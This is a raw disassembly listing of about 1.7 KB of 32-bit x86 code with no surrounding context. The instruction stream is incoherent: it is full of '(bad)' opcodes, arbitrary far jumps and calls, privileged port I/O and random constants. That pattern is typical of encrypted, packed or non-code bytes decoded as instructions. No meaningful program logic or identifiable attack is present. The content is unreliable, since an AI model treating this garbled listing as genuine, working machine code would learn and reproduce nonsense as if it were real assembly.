  41cf11:	mov    ebp,0xeb0af588
  41cf16:	jmp    0x7328:0xd0f1cde9
  41cf1d:	popf   
  41cf1e:	or     ebp,DWORD PTR [esi+eax*1]
  41cf21:	ss call 0x672c:0x5cdffa4d
  41cf29:	neg    DWORD PTR [edi]
  41cf2b:	pusha  
  41cf2c:	cdq    
  41cf2d:	xchg   edx,eax
  41cf2e:	dec    ebp
  41cf2f:	std    
  41cf30:	add    dh,BYTE PTR [edx-0x2eb0ddda]
  41cf36:	das    
  41cf37:	add    eax,DWORD PTR [edx+ebp*1]
  41cf3a:	pushf  
  41cf3b:	pop    es
  41cf3c:	loopne 0x41cf50
  41cf3e:	jmp    DWORD PTR [eax+0x39]
  41cf41:	push   cs
  41cf42:	arpl   ax,bx
  41cf44:	loop   0x41cf11
  41cf46:	jmp    0xd3a0:0x6a57864c
  41cf4d:	fild   QWORD PTR [eax+eiz*2-0x1830a61a]
  41cf54:	jno    0x41cf8a
  41cf56:	jmp    0xc79cc10a
  41cf5b:	retf   0xc454
  41cf5e:	sbb    cl,BYTE PTR [esi]
  41cf60:	aad    0xcd
  41cf62:	mov    gs,WORD PTR [ecx-0x494cf6df]
  41cf68:	mov    ch,0x45
  41cf6a:	in     eax,0x62
  41cf6c:	xchg   esp,eax
  41cf6d:	jmp    0x41cfae
  41cf6f:	cmp    bh,dl
  41cf71:	lahf   
  41cf72:	out    dx,eax
  41cf73:	push   0xffffffb2
  41cf75:	call   0x88f1:0x11f3300d
  41cf7c:	jno    0x41cfa3
  41cf7e:	je     0x41cf68
  41cf80:	cmp    al,0xb9
  41cf82:	sbb    esi,DWORD PTR [edi]
  41cf84:	xchg   ecx,eax
  41cf85:	dec    eax
  41cf86:	xor    DWORD PTR [esp+ebp*4-0x58abe2b6],ecx
  41cf8d:	test   DWORD PTR [esi],ebx
  41cf8f:	stos   DWORD PTR es:[edi],eax
  41cf90:	(bad)  
  41cf91:	mov    esi,0x796e6520
  41cf96:	adc    DWORD PTR [edi+0x5d],esp
  41cf99:	mov    esi,0xd3b7bbac
  41cf9e:	mov    ds:0xdc58b62f,al
  41cfa3:	fadd   QWORD PTR [edi-0x5c]
  41cfa6:	dec    ebx
  41cfa7:	or     BYTE PTR [edx-0x462352e7],al
  41cfad:	hlt    
  41cfae:	sub    eax,0x81974eb7
  41cfb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfb4:	xchg   edi,eax
  41cfb5:	xor    BYTE PTR [ecx-0x2fad4fd],bh
  41cfbb:	in     al,0xed
  41cfbd:	mov    bl,0x6f
  41cfbf:	mov    eax,0x46106f36
  41cfc4:	rcr    eax,1
  41cfc6:	pop    eax
  41cfc7:	cmp    eax,0xe6c58ec8
  41cfcc:	out    0xa6,eax
  41cfce:	push   esp
  41cfcf:	in     al,0x5d
  41cfd1:	pop    ebp
  41cfd2:	sbb    bh,dh
  41cfd4:	push   es
  41cfd5:	cmp    eax,0x7cb4c199
  41cfda:	or     ebp,ebx
  41cfdc:	out    dx,al
  41cfdd:	ins    DWORD PTR es:[edi],dx
  41cfde:	bound  esi,QWORD PTR ds:0x7256a32e
  41cfe4:	add    al,0x9
  41cfe6:	fs popa 
  41cfe8:	cmc    
  41cfe9:	mov    BYTE PTR [esi],ch
  41cfeb:	mov    BYTE PTR [ebx+0xe],dh
  41cfee:	jle    0x41d061
  41cff0:	push   0x2a
  41cff2:	mov    al,0x40
  41cff4:	and    DWORD PTR [eax+0x14],esp
  41cff7:	or     eax,0xc8e1be0c
  41cffc:	add    eax,0x1d6fb8a5
  41d001:	dec    ecx
  41d002:	mov    ecx,0xb253dde3
  41d007:	push   0xffffff83
  41d009:	mov    cl,0x2d
  41d00b:	push   0x45
  41d00d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d00e:	cwde   
  41d00f:	pop    edi
  41d010:	out    0x2a,eax
  41d012:	push   DWORD PTR [eax-0x75]
  41d015:	repnz push 0xe58dae7e
  41d01b:	stos   BYTE PTR es:[edi],al
  41d01c:	jne    0x41cff9
  41d01e:	movsx  ebp,ax
  41d021:	sbb    DWORD PTR [ecx-0x24],esi
  41d024:	push   edx
  41d025:	dec    edx
  41d026:	iret   
  41d027:	and    BYTE PTR ds:0xa2451516,dh
  41d02d:	outs   dx,BYTE PTR ds:[esi]
  41d02e:	in     al,dx
  41d02f:	xor    al,0xff
  41d031:	inc    ebp
  41d032:	cwde   
  41d033:	les    eax,FWORD PTR [ebp+0x5d]
  41d036:	clc    
  41d037:	stos   DWORD PTR es:[edi],eax
  41d038:	rol    BYTE PTR [edx-0x5911d015],cl
  41d03e:	clc    
  41d03f:	mov    bl,0xa0
  41d041:	fild   QWORD PTR gs:[esi]
  41d044:	ins    BYTE PTR es:[edi],dx
  41d045:	fimul  WORD PTR [edi-0x33]
  41d048:	mov    ds:0x8433704f,al
  41d04d:	retf   0x12ea
  41d050:	mov    ebp,0xff7713ad
  41d055:	or     cl,bh
  41d057:	adc    BYTE PTR [ebp-0x43],0xce
  41d05b:	adc    eax,0xb02cdbef
  41d060:	int3   
  41d061:	pop    ebp
  41d062:	mov    al,ds:0x56454be0
  41d067:	xor    al,BYTE PTR [esi+0x1c]
  41d06a:	add    DWORD PTR [ebx],edx
  41d06c:	push   DWORD PTR [ebx]
  41d06e:	aaa    
  41d06f:	cmp    edx,esp
  41d071:	hlt    
  41d072:	das    
  41d073:	push   0xea9f91a7
  41d078:	out    dx,eax
  41d079:	popf   
  41d07a:	aad    0x61
  41d07c:	pushf  
  41d07d:	cmp    al,0x58
  41d07f:	clc    
  41d080:	jge    0x41d0e8
  41d082:	pop    eax
  41d083:	ja     0x41d0bd
  41d085:	std    
  41d086:	mov    bh,0x11
  41d088:	xor    BYTE PTR [ebx],bh
  41d08a:	pushaw 
  41d08c:	mov    al,0x7
  41d08f:	jge    0x41d0f6
  41d091:	ret    
  41d092:	jne    0x41d03b
  41d094:	(bad)  
  41d095:	jae    0x41d087
  41d097:	adc    BYTE PTR [edx+0x646da4b3],dh
  41d09d:	mov    DWORD PTR ds:0xb7294b5d,esi
  41d0a3:	cmp    ecx,esi
  41d0a5:	lods   al,BYTE PTR ds:[esi]
  41d0a6:	adc    eax,0xacd2c46d
  41d0ab:	xchg   esp,eax
  41d0ac:	mov    ebx,DWORD PTR [esi+ebp*1]
  41d0af:	pusha  
  41d0b0:	dec    esi
  41d0b1:	shl    BYTE PTR [esi],1
  41d0b3:	jmp    0x29ef980a
  41d0b8:	jbe    0x41d0d0
  41d0ba:	pop    edi
  41d0bb:	mov    eax,0x7327752d
  41d0c0:	icebp  
  41d0c1:	test   eax,0xa11acd6
  41d0c6:	jb     0x41d146
  41d0c8:	inc    eax
  41d0c9:	xor    BYTE PTR [esi+0x7c],dl
  41d0cc:	(bad)  
  41d0ce:	cmp    eax,0x4e4f277
  41d0d3:	outs   dx,DWORD PTR ds:[esi]
  41d0d4:	adc    eax,0x481f1002
  41d0d9:	lods   al,BYTE PTR ds:[esi]
  41d0da:	mov    dh,0xf3
  41d0dc:	or     BYTE PTR [edx],ah
  41d0de:	and    BYTE PTR [esi+0x2c],dh
  41d0e1:	inc    eax
  41d0e2:	sbb    BYTE PTR [ebp-0x9],dh
  41d0e5:	pop    ss
  41d0e6:	pop    esp
  41d0e7:	dec    eax
  41d0e8:	cli    
  41d0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0ea:	out    0x62,al
  41d0ec:	inc    ecx
  41d0ed:	aas    
  41d0ee:	push   esi
  41d0ef:	xlat   BYTE PTR ds:[ebx]
  41d0f0:	aaa    
  41d0f1:	pusha  
  41d0f2:	mov    al,ds:0x60e49f01
  41d0f7:	mov    bh,BYTE PTR [eax+0x67]
  41d0fa:	dec    esp
  41d0fb:	inc    edi
  41d0fc:	(bad)  
  41d0fd:	call   0xae2d024f
  41d102:	loop   0x41d08c
  41d104:	push   es
  41d105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d106:	push   0x68c0a266
  41d10b:	and    bl,BYTE PTR [ebp-0x5f3ccba1]
  41d111:	je     0x41d0a0
  41d113:	repnz xchg ebp,eax
  41d115:	add    esi,esp
  41d117:	dec    ebx
  41d118:	pop    eax
  41d119:	test   DWORD PTR [esp+ebx*2],ecx
  41d11c:	fild   QWORD PTR [esi-0x7fcd56e3]
  41d122:	arpl   WORD PTR [eax+edx*4+0x6],ax
  41d126:	inc    esp
  41d127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d128:	mov    ebx,0xac82d0e7
  41d12d:	xor    ecx,0x76
  41d130:	or     eax,0x232ea5c2
  41d135:	jg     0x41d190
  41d137:	in     al,0x83
  41d139:	or     ch,BYTE PTR ds:0x2ec8dfb1
  41d13f:	sbb    ebp,DWORD PTR [ecx-0x20]
  41d142:	hlt    
  41d143:	mov    ds:0xaec59c50,eax
  41d148:	(bad)  
  41d149:	dec    edi
  41d14a:	in     eax,0xad
  41d14c:	jge    0x41d0fb
  41d14e:	inc    eax
  41d14f:	push   0xd4af2a3b
  41d154:	inc    ebx
  41d155:	mov    ds:0x41a32d4b,al
  41d15a:	arpl   WORD PTR [ebp+0x6c],cx
  41d15d:	cmp    DWORD PTR [esi-0x96ed1a5],0x74
  41d164:	mov    ch,0x91
  41d166:	fs pop ebx
  41d168:	sbb    DWORD PTR [ecx-0x30a91c56],0x3214899c
  41d172:	iret   
  41d173:	les    esp,FWORD PTR [ebx-0x7]
  41d176:	push   0x32559f55
  41d17b:	inc    edx
  41d17c:	mov    ch,0x86
  41d17e:	jmp    0xb449c727
  41d183:	mov    ah,0x3a
  41d185:	in     eax,0x37
  41d187:	in     eax,dx
  41d188:	lock xchg DWORD PTR [ecx+0x43],edi
  41d18c:	(bad)  
  41d18e:	ror    DWORD PTR [eax],cl
  41d190:	test   BYTE PTR [eax],0xd7
  41d193:	and    ah,BYTE PTR [esi-0x10b5abab]
  41d199:	loop   0x41d128
  41d19b:	dec    eax
  41d19c:	icebp  
  41d19d:	pushf  
  41d19e:	inc    edi
  41d19f:	mov    bh,BYTE PTR [ecx]
  41d1a1:	xchg   BYTE PTR [edx*1-0x4a4b92f4],ah
  41d1a8:	push   0x98f97d39
  41d1ad:	popf   
  41d1ae:	adc    BYTE PTR [ecx-0x35467854],dh
  41d1b4:	xor    DWORD PTR [ebx-0x6d],edx
  41d1b7:	add    al,0x31
  41d1b9:	shr    BYTE PTR [edi+ecx*8-0x120f160f],0x99
  41d1c1:	adc    DWORD PTR [esi],ecx
  41d1c3:	fnstsw WORD PTR [esi+0x22adbd5e]
  41d1c9:	add    al,0xc9
  41d1cb:	or     ah,al
  41d1cd:	mov    ebp,0xa124c3f2
  41d1d2:	jo     0x41d20a
  41d1d4:	pop    edx
  41d1d5:	stos   DWORD PTR es:[edi],eax
  41d1d6:	mul    BYTE PTR [ebp+esi*8+0x3d]
  41d1da:	pop    ds
  41d1db:	dec    ebp
  41d1dc:	loop   0x41d168
  41d1de:	jbe    0x41d221
  41d1e0:	fdivr  st,st(0)
  41d1e2:	test   ebp,ebx
  41d1e4:	sbb    ecx,ecx
  41d1e6:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41d1e8:	imul   esi,ebx,0xe07d4d5e
  41d1ee:	push   ebp
  41d1ef:	push   edi
  41d1f0:	(bad)  
  41d1f1:	jmp    0xe8ed55d4
  41d1f6:	in     al,dx
  41d1f7:	repnz sub edi,DWORD PTR [eax-0x2]
  41d1fb:	mov    ebp,0x613cdb65
  41d200:	push   ebp
  41d201:	aaa    
  41d202:	int    0xc1
  41d204:	int    0x6d
  41d206:	mov    gs,edi
  41d208:	add    dl,bh
  41d20a:	retf   0xea40
  41d20d:	retf   0x9164
  41d210:	sbb    BYTE PTR [eax],ah
  41d212:	lahf   
  41d213:	enter  0xc2d1,0x14
  41d217:	dec    edx
  41d218:	mov    cl,BYTE PTR [ebx]
  41d21a:	mov    dl,BYTE PTR [eax]
  41d21c:	fadd   QWORD PTR [ebp+0x7f]
  41d21f:	inc    ebx
  41d220:	add    al,0xa2
  41d222:	fdivr  DWORD PTR [ecx+0x7496e66a]
  41d228:	jne    0x41d257
  41d22a:	xchg   edx,eax
  41d22b:	icebp  
  41d22c:	sbb    BYTE PTR [ecx],cl
  41d22e:	cli    
  41d22f:	mov    ds:0xbce82ca0,al
  41d234:	pop    esp
  41d235:	inc    ecx
  41d236:	jg     0x41d1be
  41d238:	clc    
  41d239:	sahf   
  41d23a:	jne    0x41d20e
  41d23c:	sbb    al,BYTE PTR [edi+0x34]
  41d23f:	cld    
  41d240:	icebp  
  41d241:	dec    esp
  41d242:	cmp    eax,0x669b87ed
  41d247:	das    
  41d248:	or     eax,0x4c56f8e1
  41d24d:	sbb    al,0x91
  41d24f:	push   edi
  41d250:	enter  0xb12b,0x67
  41d254:	mov    DWORD PTR ds:0xc01dc1e5,ebx
  41d25a:	pop    ss
  41d25b:	fwait
  41d25c:	lea    ebp,[eax-0x4d1a2055]
  41d262:	fstp   QWORD PTR [ebp-0x77]
  41d265:	mov    al,0x52
  41d267:	or     al,BYTE PTR [eax-0x19]
  41d26a:	sbb    esi,DWORD PTR [ecx-0x3a]
  41d26d:	xchg   ecx,eax
  41d26e:	pop    edx
  41d26f:	or     DWORD PTR [edx+0x2b],ecx
  41d272:	test   bl,al
  41d274:	fst    st(6)
  41d276:	cmc    
  41d277:	xor    ah,al
  41d279:	sbb    bl,bh
  41d27b:	push   ecx
  41d27c:	jle    0x41d2f5
  41d27e:	les    ecx,FWORD PTR [ebp+0x19778b53]
  41d284:	int3   
  41d285:	jmp    0xa7df8ada
  41d28a:	jne    0x41d25f
  41d28c:	mov    cl,0xce
  41d28e:	lds    esi,FWORD PTR [edx-0x56359e55]
  41d294:	gs ins BYTE PTR es:[edi],dx
  41d296:	adc    esi,ecx
  41d298:	pop    ecx
  41d299:	add    al,0xf8
  41d29b:	test   DWORD PTR [ebx+eax*4],ebx
  41d29e:	(bad)  
  41d29f:	int3   
  41d2a0:	fs (bad) 
  41d2a2:	mov    al,bh
  41d2a4:	nop
  41d2a5:	jne    0x41d2bb
  41d2a7:	push   es
  41d2a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2a9:	ins    DWORD PTR es:[edi],dx
  41d2aa:	mov    edx,0x5b2386c3
  41d2af:	(bad)  
  41d2b1:	mov    esp,0xac5306f7
  41d2b6:	loop   0x41d2cc
  41d2b8:	inc    eax
  41d2b9:	test   al,0x41
  41d2bb:	jge    0x41d240
  41d2bd:	xor    ah,BYTE PTR [edx+0x1e]
  41d2c0:	cs leave 
  41d2c2:	cmp    ebx,0x35
  41d2c5:	mov    dh,cl
  41d2c7:	bound  esi,QWORD PTR [ecx+0x27]
  41d2ca:	(bad)  
  41d2cb:	dec    edx
  41d2cc:	xor    ah,ah
  41d2ce:	cmc    
  41d2cf:	imul   eax,ecx,0xffffffaa
  41d2d2:	stos   DWORD PTR es:[edi],eax
  41d2d3:	(bad)  
  41d2d4:	loop   0x41d28b
  41d2d6:	clc    
  41d2d7:	fiadd  WORD PTR [esi*1+0x640cfa6e]
  41d2de:	js     0x41d269
  41d2e0:	push   ecx
  41d2e1:	retf   
  41d2e2:	arpl   bx,bx
  41d2e4:	jp     0x41d33c
  41d2e6:	(bad)  
  41d2e7:	xor    BYTE PTR [edx],bl
  41d2e9:	std    
  41d2ea:	mov    bl,0x49
  41d2ec:	addr16 int3 
  41d2ee:	(bad)  
  41d2ef:	hlt    
  41d2f0:	jl     0x41d279
  41d2f2:	xor    al,0xbe
  41d2f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2f5:	scas   al,BYTE PTR es:[edi]
  41d2f6:	ds into 
  41d2f8:	popa   
  41d2f9:	shl    BYTE PTR [ebx-0xe08174],cl
  41d2ff:	ds inc edx
  41d301:	out    0x3b,eax
  41d303:	mov    bh,0x50
  41d305:	es in  eax,dx
  41d307:	or     eax,0x8e3189ef
  41d30c:	ins    BYTE PTR es:[edi],dx
  41d30d:	ins    DWORD PTR es:[edi],dx
  41d30e:	loopne 0x41d2ea
  41d310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d311:	mov    ecx,0x5dff2b12
  41d316:	dec    ecx
  41d317:	cmp    DWORD PTR [ecx+0x58e3e69],ebx
  41d31d:	xchg   edx,esp
  41d31f:	lock adc BYTE PTR [ebp+0xe],dl
  41d323:	pop    eax
  41d324:	sahf   
  41d325:	ds pop ds
  41d327:	dec    edi
  41d328:	scas   eax,DWORD PTR es:[edi]
  41d329:	(bad)  
  41d32a:	in     al,dx
  41d32b:	dec    eax
  41d32c:	pop    DWORD PTR [ebx-0x3a65e4ab]
  41d332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d333:	out    dx,al
  41d334:	push   esi
  41d335:	pop    ebp
  41d336:	adc    BYTE PTR [esi-0x22],0xe3
  41d33a:	push   cs
  41d33b:	std    
  41d33c:	jb     0x41d309
  41d33e:	scas   al,BYTE PTR es:[edi]
  41d33f:	xor    al,0xff
  41d341:	mov    bl,0x7c
  41d343:	and    bh,BYTE PTR [eax-0x31]
  41d346:	jle    0x41d2ca
  41d348:	ret    0x1ca6
  41d34b:	and    BYTE PTR [ebp-0x5c611e5f],bl
  41d351:	add    edx,esi
  41d353:	inc    edi
  41d354:	and    eax,DWORD PTR [edx-0x5b]
  41d357:	xor    DWORD PTR [esi+eiz*4-0x27],eax
  41d35b:	stc    
  41d35c:	pop    eax
  41d35d:	pop    ds
  41d35e:	and    eax,0x3af990d0
  41d363:	inc    eax
  41d364:	(bad)
  41d368:	push   eax
  41d369:	mov    edi,0x6b2893d1
  41d36e:	jae    0x41d366
  41d370:	call   FWORD PTR [edx]
  41d372:	test   al,0xaa
  41d374:	jecxz  0x41d3df
  41d376:	sbb    al,BYTE PTR [edx]
  41d378:	repz sbb DWORD PTR ds:0x50ac21fb,edi
  41d37f:	(bad)  
  41d380:	arpl   WORD PTR [ebp-0x508afabb],cx
  41d386:	cmp    BYTE PTR [eax+eiz*8],0x1c
  41d38a:	sub    ebx,DWORD PTR [eax]
  41d38c:	dec    eax
  41d38d:	and    edi,DWORD PTR [edx+0x5a11193a]
  41d393:	xchg   DWORD PTR [ebx-0x66a54d48],ecx
  41d399:	cld    
  41d39a:	adc    BYTE PTR [edi],dh
  41d39c:	out    0x39,al
  41d39e:	xchg   BYTE PTR [eax+eax*1+0x13c3f702],al
  41d3a5:	aad    0x82
  41d3a7:	arpl   di,cx
  41d3a9:	mov    bh,0xeb
  41d3ab:	ins    DWORD PTR es:[edi],dx
  41d3ac:	mov    WORD PTR [ecx],?
  41d3ae:	pop    edi
  41d3af:	jecxz  0x41d3ef
  41d3b1:	sti    
  41d3b2:	les    ecx,FWORD PTR [ebp+0x3cfe2d3f]
  41d3b8:	adc    al,0xa9
  41d3ba:	mov    eax,edx
  41d3bc:	cmp    eax,0x8c712430
  41d3c1:	(bad)  
  41d3c2:	icebp  
  41d3c3:	lahf   
  41d3c4:	and    ecx,DWORD PTR [ebx+0x37]
  41d3c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3c9:	adc    dl,ah
  41d3cb:	cli    
  41d3cc:	aaa    
  41d3cd:	gs neg al
  41d3d0:	retf   
  41d3d1:	fsub   QWORD PTR [edx]
  41d3d3:	pusha  
  41d3d4:	xchg   ch,dl
  41d3d6:	call   0xea83:0x34ab0fd8
  41d3dd:	push   esp
  41d3de:	sbb    DWORD PTR [ebp+0x6e],ecx
  41d3e1:	mov    ah,0xcf
  41d3e3:	mov    dh,0xf1
  41d3e5:	pop    edi
  41d3e6:	sbb    eax,0xf3fc3752
  41d3eb:	sbb    edi,DWORD PTR ds:0x726904a3
  41d3f1:	dec    esi
  41d3f2:	jbe    0x41d3cf
  41d3f4:	jge    0x41d41b
  41d3f6:	mov    edi,0x94a1803f
  41d3fb:	push   edi
  41d3fc:	in     al,0xf
  41d3fe:	inc    ebp
  41d3ff:	jmp    0x835:0xb52775f1
  41d406:	(bad)  
  41d407:	xchg   ecx,eax
  41d408:	outs   dx,BYTE PTR ds:[esi]
  41d409:	scas   al,BYTE PTR es:[edi]
  41d40a:	jbe    0x41d44f
  41d40c:	mov    ds:0x1f432bc7,eax
  41d411:	jmp    0x41d406
  41d413:	cmc    
  41d414:	jmp    0x41d3d4
  41d416:	jp     0x41d444
  41d418:	push   ebx
  41d419:	mov    eax,0x50356773
  41d41e:	inc    esp
  41d41f:	add    DWORD PTR [edi+0xe],0x9e1176f5
  41d426:	retf   0x605d
  41d429:	adc    BYTE PTR [eax+0x38],dh
  41d42c:	scas   eax,DWORD PTR es:[edi]
  41d42d:	aam    0xda
  41d42f:	sub    eax,0x953ee0ff
  41d434:	xor    al,0x65
  41d436:	leave  
  41d437:	fidiv  DWORD PTR [edx-0x6d]
  41d43a:	push   eax
  41d43b:	out    0x2b,eax
  41d43d:	cdq    
  41d43e:	enter  0xc2c1,0xb9
  41d442:	sar    BYTE PTR [ecx],0x2d
  41d445:	es jp  0x41d451
  41d448:	out    dx,eax
  41d449:	stos   BYTE PTR es:[edi],al
  41d44a:	cld    
  41d44b:	(bad)  
  41d44c:	outs   dx,BYTE PTR ds:[esi]
  41d44d:	cdq    
  41d44e:	leave  
  41d44f:	fsub   QWORD PTR [esi+0x76e0bc59]
  41d455:	imul   edx,DWORD PTR [ecx],0xffffffb8
  41d458:	xor    DWORD PTR [edx],0x1003cd1a
  41d45e:	cs inc ecx
  41d460:	xor    BYTE PTR [esi-0x74a1ba3a],dl
  41d466:	mov    esp,ecx
  41d468:	fimul  DWORD PTR [ebp+edi*2-0x3e9b0b38]
  41d46f:	mov    esi,0xfb91e6c1
  41d474:	add    bh,BYTE PTR [ecx-0x6b]
  41d477:	fdivr  DWORD PTR [esi]
  41d479:	push   ebx
  41d47a:	popf   
  41d47b:	fwait
  41d47c:	sti    
  41d47d:	mov    al,ds:0x2f82c739
  41d482:	xor    bl,ah
  41d484:	out    dx,eax
  41d485:	icebp  
  41d486:	add    BYTE PTR [ebx+0x6c],cl
  41d489:	jle    0x41d47b
  41d48b:	sbb    ch,BYTE PTR [edx]
  41d48d:	cmp    eax,DWORD PTR [esi-0x77]
  41d490:	mov    edx,0x122c9e9d
  41d495:	enter  0x1ed3,0x4b
  41d499:	es call 0x2720edfb
  41d49f:	sbb    ecx,esp
  41d4a1:	sub    eax,ebp
  41d4a3:	xor    edi,esp
  41d4a5:	dec    BYTE PTR [eax+0x3e0e152f]
  41d4ab:	mov    gs,WORD PTR [edx-0x387e8d52]
  41d4b1:	pusha  
  41d4b2:	lds    eax,FWORD PTR [eax+esi*2-0x3bbfc8ad]
  41d4b9:	xchg   edx,eax
  41d4ba:	xor    edi,ebp
  41d4bc:	call   0xca86:0x8a1c083e
  41d4c3:	in     eax,0x79
  41d4c5:	hlt    
  41d4c6:	push   0x8583e3d5
  41d4cb:	and    cl,BYTE PTR [edi+eiz*8+0x74]
  41d4cf:	dec    edx
  41d4d0:	jno    0x41d50c
  41d4d2:	cmp    eax,0xf43dfcc0
  41d4d7:	sub    eax,0x12c53288
  41d4dc:	mov    bh,0xf1
  41d4de:	cdq    
  41d4df:	pop    esp
  41d4e0:	or     BYTE PTR [ecx+edi*4],0xc5
  41d4e4:	hlt    
  41d4e5:	add    DWORD PTR [ecx+0x6e],edi
  41d4e8:	jmp    DWORD PTR [edi]
  41d4ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4eb:	jl     0x41d4da
  41d4ed:	call   FWORD PTR [edi+ebx*2+0x3]
  41d4f1:	sub    al,0x66
  41d4f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4f4:	imul   ecx,DWORD PTR ds:0xd2538de4,0x7a
  41d4fb:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41d4fd:	mov    ecx,DWORD PTR [eax+0x1cfd89a]
  41d503:	and    esi,DWORD PTR [ebp+0x60718056]
  41d509:	pop    es
  41d50a:	loope  0x41d511
  41d50c:	mov    ch,0xc8
  41d50e:	out    0xc3,eax
  41d510:	enter  0xd78e,0xa6
  41d514:	idiv   BYTE PTR [edi+0x4437556e]
  41d51a:	mov    ebp,esp
  41d51c:	or     BYTE PTR [ebx-0x32d571e1],ch
  41d522:	mov    bl,0xd4
  41d524:	inc    ebx
  41d525:	ins    DWORD PTR es:[edi],dx
  41d526:	push   0x61da4139
  41d52b:	test   eax,0x23fff8a
  41d530:	push   ebx
  41d531:	jo     0x41d4f4
  41d533:	retf   0xa908
  41d536:	push   edi
  41d537:	mov    ebp,0x37f66e86
  41d53c:	push   esp
  41d53d:	push   0x642eb5ac
  41d542:	mov    eax,0x60b28ec9
  41d547:	dec    ebx
  41d548:	sub    BYTE PTR [esi+0x183ffde0],0xd6
  41d54f:	in     eax,dx
  41d550:	cwde   
  41d551:	popf   
  41d552:	cmp    DWORD PTR [ecx-0x70],esp
  41d555:	fadd   DWORD PTR [eax-0x66eba0b0]
  41d55b:	jg     0x41d587
  41d55d:	std    
  41d55e:	test   eax,0x488838ac
  41d563:	out    dx,eax
  41d564:	cmp    eax,eax
  41d566:	pop    ss
  41d567:	popf   
  41d568:	mov    dl,0xb1
  41d56a:	adc    eax,0x5e1b66d9
  41d56f:	sbb    BYTE PTR [esp+ebx*8+0x6d6b9098],ch
  41d576:	push   cs
  41d577:	sbb    DWORD PTR ds:0xa2022a26,ecx
  41d57d:	jecxz  0x41d54b
  41d57f:	jbe    0x41d5d4
  41d581:	(bad)  
  41d582:	std    
  41d583:	pop    edx
  41d584:	ja     0x41d551
  41d586:	pushf  
  41d587:	inc    ecx
  41d588:	dec    esp
  41d589:	sbb    al,0xc8
  41d58b:	in     al,dx
  41d58c:	clc    
  41d58d:	mov    ebx,0xf8681698
  41d592:	xor    eax,0xe2ede528
  41d597:	ficomp WORD PTR [edx+0x79]
  41d59a:	sbb    ecx,DWORD PTR [eax-0x37]
  41d59d:	int    0xb1
  41d59f:	sti    
  41d5a0:	cmp    BYTE PTR [eax],bl
  41d5a2:	sbb    DWORD PTR [ebp-0x4a],ecx
  41d5a5:	in     al,dx
  41d5a6:	loop   0x41d57b
  41d5a8:	jecxz  0x41d60e
  41d5aa:	jno    0x41d5df
  41d5ac:	pop    ss
  41d5ad:	mov    al,ds:0xbcb84b01
  41d5b2:	mov    esi,0x1cafe997
  41d5b7:	repnz stos DWORD PTR es:[edi],eax
  41d5b9:	iret   
  41d5ba:	sbb    edi,DWORD PTR [edx+0x43095244]
  41d5c0:	scas   al,BYTE PTR es:[edi]
  41d5c1:	push   esp
  41d5c2:	adc    al,0xfb
  41d5c4:	jp     0x41d614
  41d5c6:	cmp    eax,0xaec808c7
  41d5cb:	cmp    BYTE PTR [edi+0x1f],ah
  41d5ce:	push   cs
  41d5cf:	loop   0x41d59f
  41d5d1:	ret    0x4753
  41d5d4:	mov    al,ds:0xb9055561
  41d5d9:	cwde   
  41d5da:	inc    esi
  41d5db:	mov    ecx,0xf311c8e
  41d5e0:	mov    ch,0xe4
  41d5e2:	pushf  
  41d5e3:	je     0x41d65d
  41d5e5:	pop    esp
  41d5e6:	scas   al,BYTE PTR es:[edi]
  41d5e7:	stc    
  41d5e8:	pop    eax
  41d5e9:	pop    ebp
  41d5ea:	pushf  
  41d5eb:	mov    dl,0xf0
  41d5ed:	jg     0x41d62d
  41d5ef:	call   0x7bbb:0xb546ab96
  41d5f6:	dec    edi
  41d5f7:	ret    
  41d5f8:	sub    edx,0xffffff96
  41d5fb:	jmp    0x41d670
  41d5fd:	xchg   edi,eax
  41d5fe:	(bad)  
  41d600:	(bad)  
  41d601:	loopne 0x41d587
  41d603:	pop    edi
  41d604:	mov    ecx,0xbbfa3978
  41d609:	xchg   bl,bh
  41d60b:	or     al,ah
  41d60d:	pop    ebp
  41d60e:	fisttp DWORD PTR [eax]
  41d610:	xchg   edi,eax
  41d611:	push   0x3d
  41d613:	pushf  
  41d614:	xor    al,0xa3
  41d616:	(bad)  
  41d618:	(bad)  
  41d619:	xchg   ebp,eax
  41d61a:	sub    ch,BYTE PTR [eax-0x71b3ba8b]
  41d620:	sub    ecx,ebx
  41d622:	retf   0x8a61
  41d625:	cdq    
  41d626:	aam    0x50
  41d628:	push   ss
  41d629:	dec    esp
  41d62a:	push   ebx
  41d62b:	adc    DWORD PTR [ebx],ebp
  41d62d:	mov    bl,0xc7
  41d62f:	push   es
  41d630:	fbstp  TBYTE PTR [esi]
  41d632:	retf   0x772b
  41d635:	ss (bad) 
  41d637:	mov    ds:0x110eb2a6,eax
  41d63c:	fld    TBYTE PTR [edx]
  41d63e:	push   ecx
  41d63f:	or     eax,0xda881577
  41d644:	je     0x41d5e8
  41d646:	xor    ebp,0xffffff9c
  41d649:	jne    0x41d6a0
  41d64b:	push   ss
  41d64c:	ins    BYTE PTR es:[edi],dx
  41d64d:	in     al,0x80
  41d64f:	stc    
  41d650:	dec    ebp
  41d651:	(bad)  
  41d652:	cdq    
  41d653:	dec    edi
  41d654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d655:	mov    ds:0x729f5002,eax
  41d65a:	(bad)
  41d65e:	mov    al,ds:0x937de3fc
  41d663:	stos   BYTE PTR es:[edi],al
  41d664:	jl     0x41d6e2
  41d666:	push   es
  41d667:	shl    ebx,cl
  41d669:	pop    esi
  41d66a:	aaa    
  41d66b:	add    ebp,ebp
  41d66d:	das    
  41d66e:	push   ecx
  41d66f:	mov    esi,0x1178907
  41d674:	pop    edx
  41d675:	in     eax,0xa0
  41d677:	xor    edx,DWORD PTR [esi-0x56e5aeb]
  41d67d:	fist   WORD PTR [eax+0x69]
